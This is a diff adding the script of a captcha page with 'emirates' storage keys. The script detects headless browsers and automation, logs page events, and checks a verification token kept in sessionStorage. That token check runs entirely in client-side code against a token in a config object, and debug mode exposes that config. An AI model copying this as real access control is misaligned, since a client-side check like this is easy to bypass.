+        function showError(message) {
+            const successDiv = document.getElementById('success-message');
+            const errorDiv = document.getElementById('error-message');
+            const errorText = document.getElementById('error-text');
+            
+            successDiv.style.display = 'none';
+            errorText.textContent = message;
+            errorDiv.style.display = 'block';
+            
+            // Auto-hide after 5 seconds
+            setTimeout(hideError, 5000);
+        }
+
+        // Hide error message
+        function hideError() {
+            const errorDiv = document.getElementById('error-message');
+            errorDiv.style.display = 'none';
+        }
+
+        // Detect suspicious activity
+        function detectSuspiciousActivity() {
+            // Check for headless browsers
+            const headlessIndicators = [
+                'HeadlessChrome',
+                'PhantomJS',
+                'Nightmare',
+                'Selenium',
+                'Puppeteer',
+                'Playwright',
+                'WebDriver'
+            ];
+            
+            const userAgent = navigator.userAgent;
+            for (const indicator of headlessIndicators) {
+                if (userAgent.includes(indicator)) {
+                    logSecurityEvent('suspicious_headless', { 
+                        indicator: indicator,
+                        userAgent: userAgent.substring(0, 100) 
+                    });
+                    break;
+                }
+            }
+            
+            // Check for automation tools
+            if (navigator.webdriver === true) {
+                logSecurityEvent('suspicious_webdriver', {});
+            }
+            
+            // Check for unusual screen properties
+            if (window.screen.width < 100 || window.screen.height < 100) {
+                logSecurityEvent('suspicious_screen', {
+                    width: window.screen.width,
+                    height: window.screen.height
+                });
+            }
+        }
+
+        // Log security events
+        function logSecurityEvent(event, data) {
+            const logEntry = {
+                event,
+                timestamp: new Date().toISOString(),
+                sessionId: captchaState.sessionId,
+                device: captchaState.deviceType,
+                page: 'captcha.html',
+                domain: window.location.hostname,
+                userAgent: navigator.userAgent.substring(0, 150),
+                data
+            };
+            
+            if (CONFIG.debugMode) {
+                console.log('Security Event:', logEntry);
+            }
+            
+            // In production, send to your security monitoring endpoint
+            // Example:
+            // fetch('/api/security/log', {
+            //     method: 'POST',
+            //     headers: { 'Content-Type': 'application/json' },
+            //     body: JSON.stringify(logEntry)
+            // }).catch(err => console.error('Logging error:', err));
+        }
+
+        // Setup event listeners
+        function setupEventListeners() {
+            // Prevent form submission
+            document.addEventListener('submit', function(e) {
+                e.preventDefault();
+            });
+            
+            // Handle page visibility changes
+            document.addEventListener('visibilitychange', function() {
+                if (document.hidden) {
+                    logSecurityEvent('page_hidden', {
+                        hiddenTime: new Date().toISOString()
+                    });
+                } else {
+                    logSecurityEvent('page_visible', {
+                        visibleTime: new Date().toISOString()
+                    });
+                }
+            });
+            
+            // Listen for beforeunload to log exit
+            window.addEventListener('beforeunload', function() {
+                logSecurityEvent('page_unload', {
+                    verified: captchaState.isVerified,
+                    session: captchaState.sessionId,
+                    attempts: captchaState.attempts
+                });
+            });
+            
+            // Handle window resize for responsive adjustments
+            let resizeTimeout;
+            window.addEventListener('resize', function() {
+                clearTimeout(resizeTimeout);
+                resizeTimeout = setTimeout(function() {
+                    captchaState.deviceType = detectDevice();
+                    logSecurityEvent('viewport_resize', {
+                        width: window.innerWidth,
+                        height: window.innerHeight,
+                        device: captchaState.deviceType
+                    });
+                }, 500);
+            });
+        }
+
+        // Function to check verification on other pages
+        window.checkCaptchaVerification = function() {
+            try {
+                const saved = sessionStorage.getItem('emirates_captcha_verification');
+                if (!saved) {
+                    if (CONFIG.debugMode) console.log('No verification found in session');
+                    return false;
+                }
+                
+                const data = JSON.parse(saved);
+                const isValid = data.verified && 
+                               data.token === CONFIG.verificationToken && 
+                               data.expiry > Date.now();
+                
+                if (!isValid) {
+                    sessionStorage.removeItem('emirates_captcha_verification');
+                    sessionStorage.removeItem('emirates_security_verified');
+                }
+                
+                if (CONFIG.debugMode) {
+                    console.log('Verification check result:', isValid);
+                }
+                
+                return isValid;
+            } catch (e) {
+                console.error('Error checking verification:', e);
+                return false;
+            }
+        };
+
+        // Function to clear verification (for logout)
+        window.clearCaptchaVerification = function() {
+            try {
+                sessionStorage.removeItem('emirates_captcha_verification');
+                sessionStorage.removeItem('emirates_security_verified');
+                localStorage.removeItem('emirates_last_captcha');
+                
+                if (CONFIG.debugMode) {
+                    console.log('Verification cleared');
+                }
+                
+                return true;
+            } catch (e) {
+                console.error('Error clearing verification:', e);
+                return false;
+            }
+        };
+
+        // Helper function for other pages to get device info
+        window.getDeviceInfo = function() {
+            return {
+                type: captchaState.deviceType,
+                sessionId: captchaState.sessionId,
+                userAgent: navigator.userAgent
+            };
+        };
+
+        // For debugging (remove in production)
+        if (CONFIG.debugMode) {
+            window.captchaState = captchaState;
+            window.CONFIG = CONFIG;
+            console.log('Debug mode enabled - captchaState and CONFIG exposed');
+        }
+    </script>
+</body>
+</html>
